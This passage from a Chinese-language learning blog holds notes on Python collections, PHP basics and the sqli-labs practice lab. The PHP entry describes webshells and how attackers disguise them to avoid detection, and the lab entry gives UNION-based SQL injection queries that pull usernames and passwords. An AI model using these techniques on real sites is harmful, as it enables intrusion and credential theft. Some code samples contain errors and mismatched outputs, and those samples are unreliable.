class="hljs-params">(list1)</span></span><br>list2=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;hello &#x27;</span>]</span>*<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list2)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(len(list1)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(f<span class="hljs-string">&#x27;最后一位是&#123;list1[-1]&#125;,倒数第二位是&#123;list1[-2]&#125;&#x27;</span>)</span></span><br>#遍历列表<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(list1)):<br>    <span class="hljs-built_in">print</span>(list1<span class="hljs-selector-attr">[i]</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-built_in">print</span>(j)<br><span class="hljs-keyword">for</span> index,el <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(list1):       #enumerate是一个可以同时返回列表中的位数和元素的函数<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;第&#123;index&#125;位数字是&#123;el&#125;&#x27;</span>)<br>list3=<span class="hljs-selector-attr">[2,4,6,8,10,12,14,16]</span><br>list3<span class="hljs-selector-class">.append</span>(<span class="hljs-number">200</span>)          <span class="hljs-selector-id">#list</span><span class="hljs-selector-class">.append</span>(elem) element<br>list3<span class="hljs-selector-class">.insert</span>(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>)          <span class="hljs-selector-id">#list</span><span class="hljs-selector-class">.insert</span>(index,elem)   在具体序号处添加一个元素<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list3)</span></span><br>list3+=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;xsa&#x27;</span>]</span>       #等价于list3<span class="hljs-selector-class">.extend</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;xsa&#x27;</span>]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list3)</span></span><br>list3<span class="hljs-selector-class">.remove</span>(<span class="hljs-string">&#x27;xsa&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;abc&#x27;</span> <span class="hljs-keyword">in</span> list3:<br>    list3<span class="hljs-selector-class">.remove</span>(<span class="hljs-string">&#x27;abc&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list3)</span></span><br>list3<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list3)</span></span><br>list3<span class="hljs-selector-class">.clear</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list3)</span></span><br></code></pre></td></tr></table></figure><p>列表2</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">fruit=[<span class="hljs-string">&#x27;apple&#x27;</span>,<span class="hljs-string">&#x27;orange&#x27;</span>,<span class="hljs-string">&#x27;pear&#x27;</span>,<span class="hljs-string">&#x27;watermelon&#x27;</span>,<span class="hljs-string">&#x27;strawberry&#x27;</span>,<span class="hljs-string">&#x27;zoo&#x27;</span>]<br><span class="hljs-built_in">print</span>(fruit)<br><span class="hljs-attribute">fruit1</span>=fruit<br><span class="hljs-built_in">print</span>(fruit1)<br><span class="hljs-attribute">fruit2</span>=fruit[::-1]<br><span class="hljs-built_in">print</span>(fruit2)<br><span class="hljs-attribute">fruit3</span>=sorted(fruit)       #默认按字母顺序排序,a-z,不会改变原列表的值,而是生成一个新的列表<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;&#123;fruit&#125;\n&#123;fruit3&#125;&#x27;</span>)<br><span class="hljs-attribute">f4</span>=sorted(fruit,reverse=True)   #默认是<span class="hljs-literal">False</span>,设置成<span class="hljs-literal">True</span>后会反序排列<br><span class="hljs-built_in">print</span>(f4)<br><span class="hljs-attribute">f5</span>=sorted(fruit,key=len)   #按照长度排序<br><span class="hljs-built_in">print</span>(f5)<br><span class="hljs-attribute">f6</span>=sorted(fruit,key=lambda s<span class="hljs-keyword">:len</span>(s))<br><span class="hljs-built_in">print</span>(f6)<br><span class="hljs-attribute">f7</span>=sorted(fruit,key=lambda s:s.upper())<br><span class="hljs-built_in">print</span>(f7)<br></code></pre></td></tr></table></figure><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import sys<br>f=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10)]<br><span class="hljs-built_in">print</span>(f)<br>f=[x+y <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;abcd&#x27;</span> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;12345678&#x27;</span>]<br><span class="hljs-built_in">print</span>(f)<br>f=[x*<span class="hljs-number">*2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(1,10)]<br><span class="hljs-built_in">print</span>(sys.getsizeof(f)) <br><span class="hljs-built_in">print</span>(f)<br>f=(x*<span class="hljs-number">*2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(1,10))<br><span class="hljs-built_in">print</span>(sys.getsizeof(f))<br><span class="hljs-built_in">print</span>(f)                  #生成器,但没看懂<br>def fib(n):               #用了yield关键词,所以是生成器函数<br>    a,<span class="hljs-attribute">b</span>=0,1<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(n):<br>        a,<span class="hljs-attribute">b</span>=b,a+b<br>        yield a<br>def p(n):<br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> fib(n):<br>        <span class="hljs-built_in">print</span>(val)<br><span class="hljs-attribute">x</span>=int(input())<br>p(x)<br></code></pre></td></tr></table></figure><h3 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple) ()"></a>元组(tuple) ()</h3><p>列表(list)<br>元组数据不可更改,元组可跟列表互相转化</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=(<span class="hljs-string">&#x27;fruit&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;sd1&#x27;</span>)   <span class="hljs-comment">#元组</span><br><span class="hljs-attr">b</span>=[<span class="hljs-string">&#x27;fruit&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;sd1&#x27;</span>]   <span class="hljs-comment">#列表</span><br><span class="hljs-attr">c</span>=list(a)             <span class="hljs-comment">#元组变为列表</span><br><span class="hljs-attr">d</span>=tuple(b)            <span class="hljs-comment">#变为元组</span><br></code></pre></td></tr></table></figure><h3 id="集合-set"><a href="#集合-set" class="headerlink" title="集合(set) {}"></a>集合(set) {}</h3><p>主要用于交集并集等集合语法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>b=<span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>))<br>c=&#123;x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)&#125;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(f<span class="hljs-string">&#x27;&#123;a&#125;\n&#123;b&#125;\n&#123;c&#125;&#x27;</span>)</span></span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.add</span>(<span class="hljs-number">8</span>)<br><span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.update</span>(<span class="hljs-selector-attr">[11,12]</span>)<br>c<span class="hljs-selector-class">.pop</span>()        #不输入就是<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(f<span class="hljs-string">&#x27;&#123;a&#125;\n&#123;b&#125;\n&#123;c&#125;&#x27;</span>)</span></span><br>d=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span><br>d<span class="hljs-selector-class">.pop</span>()<br>d<span class="hljs-selector-class">.pop</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d.pop(<span class="hljs-number">2</span>)</span></span>)   #错误的,set类型是无序的,不能指定index删除,<span class="hljs-built_in">pop</span>()会返回最后一位并删除,<span class="hljs-built_in">remove</span>()只删除不返回<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span><br></code></pre></td></tr></table></figure><h3 id="字典-dict"><a href="#字典-dict" class="headerlink" title="字典(dict) {}"></a>字典(dict) {}</h3><p>必须有一对元素(键值对)<br>在字典dict的定义中,如果键是有效的 Python 标识符,那么就不需要加引号。<br>Python 的有效标识符包括:</p><ul><li><p>字母(A-z)</p></li><li><p>数字(0-9)</p></li><li><p>下划线(_)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-string">&#x27;a&#x27;</span><br>stu=&#123;<span class="hljs-string">&#x27;age&#x27;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&#x27;score&#x27;</span>:<span class="hljs-number">95</span>,<span class="hljs-selector-tag">a</span>:<span class="hljs-number">8</span>&#125;      #定义过的变量可以直接当键使用,不需要加<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu)</span></span><br>a=<span class="hljs-built_in">dict</span>(name=<span class="hljs-number">1</span>,gender=<span class="hljs-number">2</span>)     #这里键不能加<span class="hljs-string">&#x27;&#x27;</span>,必须要直接输<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><br>key=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;age&#x27;</span>]</span><br>val=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;zs&#x27;</span>,12]</span><br>di=<span class="hljs-built_in">zip</span>(key,val)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(di)</span></span><br>di=<span class="hljs-built_in">dict</span>(di)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(di)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(di[<span class="hljs-string">&#x27;name&#x27;</span>])</span></span><br>di<span class="hljs-selector-class">.update</span>(gen=<span class="hljs-string">&#x27;m&#x27;</span>)          #键不能加<span class="hljs-string">&#x27;&#x27;</span>,而值如果是字符串则要加<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(di)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(di.get(<span class="hljs-string">&#x27;name&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure></li></ul><h1 id="5-3"><a href="#5-3" class="headerlink" title="5.3"></a>5.3</h1><p>摆烂</p><h1 id="5-4"><a href="#5-4" class="headerlink" title="5.4"></a>5.4</h1><p>数学期中</p>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php</title>
    <link href="/2023/08/20/php/"/>
    <url>/2023/08/20/php/</url>
    
    <content type="html"><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php代码要被&lt;?php ?&gt;包裹起来</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><p>可以输出多个内容(用,分隔开),结尾必须加;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="print"><a href="#print" class="headerlink" title="print"></a>print</h4><p>只能输出单个内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">print</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span>=1;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;phpstudy&#x27;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>php打印变量时要带上$符号</p><p>变量不能以数字开头,不能带空格</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>布尔(Boolean)</td><td><code>true</code>和<code>false</code></td></tr><tr><td>整型(Integer)</td><td></td></tr><tr><td>浮点(Float)</td><td></td></tr><tr><td>字符串(String)</td><td></td></tr></tbody></table><p>var_dump() 可以打印数据类型和值,var_dump()是个函数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=1;</span><br>var_dump(<span class="hljs-symbol">$</span>a);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>'<hr>'```换行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs echo"><br>#### 引号区别<br><br>双引号<br><br></code></pre></td></tr></table></figure><p>$str&#x3D;”abc”;<br>echo “$str 123”;    &#x2F;&#x2F;abc 123    双引号内可以解析变量</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>单引号<br><br></code></pre></td></tr></table></figure><p>$str&#x3D;”abc”;<br>echo ‘$str 123’;    &#x2F;&#x2F;$str 123   单引号原样打印</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br><span class="hljs-comment">#### 特殊数据类型</span><br><br>|<span class="hljs-string"> 类型     </span>|<span class="hljs-string"> 描述   </span>|<br>|<span class="hljs-string"> -------- </span>|<span class="hljs-string"> ------ </span>|<br>|<span class="hljs-string"> array    </span>|<span class="hljs-string"> 数组   </span>|<br>|<span class="hljs-string"> object   </span>|<span class="hljs-string"> 对象   </span>|<br>|<span class="hljs-string"> callable </span>|<span class="hljs-string"> 可调用 </span>|<br>|<span class="hljs-string"> iterable </span>|<span class="hljs-string"> 可迭代 </span>|<br>|<span class="hljs-string"> NULL     </span>|<span class="hljs-string"> 空值   </span>|<br>|<span class="hljs-string"> resource </span>|<span class="hljs-string"> 资源   </span>|<br><br><span class="hljs-comment">#### 数组 </span><br><br><span class="hljs-comment">##### array()</span><br><br></code></pre></td></tr></table></figure><p>$a &#x3D; array(“first”,”second”,”third”);<br>echo “the first element is “.$a[0].” and the second element is “.$a[1];</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br>也可以用<span class="hljs-selector-attr">[]</span>创建数组<br><br></code></pre></td></tr></table></figure><p>$c&#x3D;[‘A’,’B’,’C’];</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><br>也可以用键值对的形式创建数组<span class="hljs-comment">(类似c的二维数组)</span>,每个键名都是只能用一次的,但是键名可以有很多个,键值可以是任意,可以是字符串,整型,布尔,也可以是数组,<br><br>键和键用逗号分隔<br><br>引用时arr[<span class="hljs-string">&#x27;a&#x27;</span>] ,必须加<span class="hljs-string">&#x27;&#x27;</span>,键名可以和外界的变量重名,因为所处命名空间不同<br><br></code></pre></td></tr></table></figure><p>$arr&#x3D;array(<br>    ‘a’&#x3D;1,                   &#x2F;&#x2F;此时’a’的值为1,arr[‘a’]的值为1,是int型<br>    ‘b’&#x3D;’1’,                 &#x2F;&#x2F;arr[‘b’]&#x3D;’1’,是string型<br>    ‘c’&#x3D;wefu,                &#x2F;&#x2F;报错<br>);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>##### compact()<br><br>和array()类似,但是可以解析变量,会自动将变量名作为键名,变量对应的值作为键值存进数组<br><br></code></pre></td></tr></table></figure><p>$firstname &#x3D; “Aabyss”;<br>$lastname &#x3D; “ZG”;<br>$age &#x3D; “21”;<br>$result &#x3D; compact(“firstname”, “lastname”, “age”);<br>print_r($result);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>Array<br>(<br>    [firstname] &#x3D;&gt; John<br>    [lastname] &#x3D;&gt; Doe<br>)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### 运算符<br><br>#### 按位与&amp;<br><br>```php<br>$a=<span class="hljs-number">7</span>;<br>echo ($a &amp; <span class="hljs-number">1</span>);           <span class="hljs-comment">//让一个数的二进制对1进行按位与操作,则可以判断这个数是否为奇数,7的二进制是111,跟001进行按位与,结果是1,所以是真,即7为奇数 打印出的值为1</span><br></code></pre></td></tr></table></figure><p><img src="C:/Users/10913/AppData/Roaming/Typora/typora-user-images/image-20230707101456164.png" alt="image-20230707101456164"></p><h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__LINE__</span>;         <span class="hljs-comment">// 输出当前行号的整数值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FILE__</span>;         <span class="hljs-comment">// 输出当前文件的完整路径和文件名</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__DIR__</span>;          <span class="hljs-comment">// 输出当前文件所在的目录</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FUNCTION__</span>;     <span class="hljs-comment">// 输出当前函数（或方法）的名称</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__CLASS__</span>;        <span class="hljs-comment">// 输出当前类的名称</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__METHOD__</span>;       <span class="hljs-comment">// 输出当前方法的名称</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__NAMESPACE__</span>;    <span class="hljs-comment">// 输出当前命名空间的名称</span><br></code></pre></td></tr></table></figure><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">function &lt;functionname&gt;(&lt;type&gt; $variable): &lt;return type&gt; &#123; <br>// 函数体 <br>&#125;<br>function bubbleSort(array $arr):<span class="hljs-built_in"> array </span>&#123;<br></code></pre></td></tr></table></figure><p>&lt;type&gt;和&lt;return type&gt;可以省略</p><h3 id="回调函数及webshell免杀"><a href="#回调函数及webshell免杀" class="headerlink" title="回调函数及webshell免杀"></a>回调函数及webshell免杀</h3><h4 id="webshell定义"><a href="#webshell定义" class="headerlink" title="webshell定义"></a>webshell定义</h4><p>webshell通常是一个类似可执行文件的.php文件,类似木马</p><p>通常情况下，Webshell是一个以.php为扩展名的文件，它可以被上传到受攻击的Web服务器上。Webshell的设计目的是为了在受感染的服务器上执行各种恶意操作。</p><p>Webshell的外观可以与普通的PHP脚本文件相似，但其功能更加强大和危险。它通常包含恶意代码，使攻击者能够通过Web界面与服务器进行交互，并执行各种操作，如执行系统命令、访问文件系统、修改文件内容、上传&#x2F;下载文件、连接数据库等。</p><h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><ol><li>修改Webshell代码：通过对Webshell代码进行修改，使其不易被安全防护软件的签名或行为检测规则所识别。这可以包括修改变量名、函数名、代码结构等。</li><li>绕过特征检测：针对安全防护软件的特征检测功能，攻击者可能会修改Webshell的特征，使其不再符合常见的恶意代码特征，从而逃避检测。</li></ol><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>简单来说就是一个函数的参数包含另一个函数,即在一个函数内使用另一个函数</p><h4 id="1-array-map"><a href="#1-array-map" class="headerlink" title="1.array_map()"></a>1.array_map()</h4><p>array_map()用法就是array_map(回调函数,要被进行操作的参数)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 定义一个回调函数<br><span class="hljs-keyword">function</span> square(<span class="hljs-variable">$n</span>) &#123;<br>  return <span class="hljs-variable">$n</span> * <span class="hljs-variable">$n</span>;<br>&#125;<br><br><span class="hljs-regexp">//</span> 定义一个数组<br><span class="hljs-variable">$numbers</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br><span class="hljs-regexp">//</span> 应用回调函数到数组的每个元素<br><span class="hljs-variable">$result</span> = array_map(<span class="hljs-string">&quot;square&quot;</span>, <span class="hljs-variable">$numbers</span>);<br><br><span class="hljs-regexp">//</span> 输出处理后的结果<br>print_r(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs</title>
    <link href="/2023/08/20/sql-labs/"/>
    <url>/2023/08/20/sql-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlilabs安装"><a href="#sqlilabs安装" class="headerlink" title="sqlilabs安装"></a>sqlilabs安装</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>1.下载phpstudy<br>2.在www文件夹下<code>https://github.com/Audi-1/sqli-labs.git</code><br>3.在sql-connections文件夹下,打开db-creds.inc文件(用notepad++方便),更改密码为root,复制security</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>1.phpstudy面板,打开mysql工具,mysql命令行<br>2.<code>create database security;</code><br>3.<code>use security</code><br>4.sql文件导入数据库，此处需要用到sql-lab.sql文件,<code>source (C:\software\phpstudy\WWW\sqli-labs\sql-lab.sql)(sql-lab.sql的文件路径)</code></p><h2 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h2><p><a href="http://localhost/sqli-labs">http://localhost/sqli-labs</a><br>点开第一个set up,再返回即可</p><h1 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h1><h2 id="information-schmea"><a href="#information-schmea" class="headerlink" title="information_schmea"></a>information_schmea</h2><p>这个是自带的数据库,从这里可以查询建立的数据库名及表名</p><h3 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h3><p><code>select table_name from information_schema.tables where table_schema=database()</code></p><p>(table_name存储所有表名,table_schema存储所有数据库名)</p><p>(这里的顺序是先用database()得到数据库名,用数据库名赋值给table_schema,从而限定information_schema.tables的查找范围限定在当前数据库,再查询对应的表名)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p>前面的查询可能会只查询出一条结果,但是实际要查的表名可能很多,比如passwd和key,这样用group_concat就可以联合查询,让所有内容一起输出</p><p>假设查出的表名为stu</p><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><p><code>select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = &#39;stu&#39;</code></p><p>(加where table_schema&#x3D;database()是为了防止有不同数据库内有重复表名的存在)</p><p>查信息 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs select">union select 1,group_concat(username),group_concat(passwd) from information_schema=database() and table_name= &#x27;stu&#x27; <br>也可以 <br>union select 1,group_concat(username),group_concat(passwd) from stu <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230629123719.png"></p><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><table><thead><tr><th>函数名</th><th>例子</th><th>作用</th></tr></thead><tbody><tr><td>group_concat()</td><td>group_concat(id,name,passwd)  &#x2F; group_concat(version(),database())</td><td>将()内的内容聚合到一行输出</td></tr><tr><td>database()</td><td></td><td>查询数据库名</td></tr><tr><td>version()</td><td></td><td>查询版本信息</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h2 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 